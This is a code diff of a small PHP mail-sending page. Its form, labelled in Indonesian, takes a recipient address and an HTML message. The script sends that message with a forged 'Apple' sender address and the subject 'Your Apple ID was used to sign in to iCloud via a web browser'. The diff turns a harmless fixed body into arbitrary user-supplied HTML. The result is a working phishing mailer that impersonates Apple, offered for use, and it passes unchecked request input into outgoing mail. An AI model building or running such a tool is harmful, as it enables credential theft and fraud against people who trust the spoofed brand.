@@ -1,8 +1,20 @@
 <body 
-<html> <head> </head>
+<html> <head>
+<style>
+.mainContent {
+    width: 39%;
+    margin: 2.9em auto;
+    background: #fff;
+    padding: 2.9em;
+}
+</style>
+ </head>
 <body> 
+<div class="mainContent">
+    <h2>PHP MAILER/ <small><a href="https://facebook.com/like.a.code">Social Media Coder</a></small></h2>
 <form action="#" method="get">
  <input type="text" name="email" placeholder="masukan email"></input><br/>
+<p><textarea name="pesan" placeholder="Pesan anda" rows="7" cols="50" required>Dimasukan dengan format html</textarea>
  <input type="submit" name="submit" value="Submit"></input>
 </form>
 </body>
@@ -12,8 +24,7 @@
 <?php 
 $name = "Apple"; $to = $_GET ['email']; $web="$_SERVER[HTTP_HOST]"; 
 $subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
-$body = '  
-<a href="https://google.com/">Hello world</a> how are you? '; 
+$body = $_GET ['pesan'];
 $email = "Apple@$web"; 
 $headers = 'From: ' .
 $email . "\r\n". 
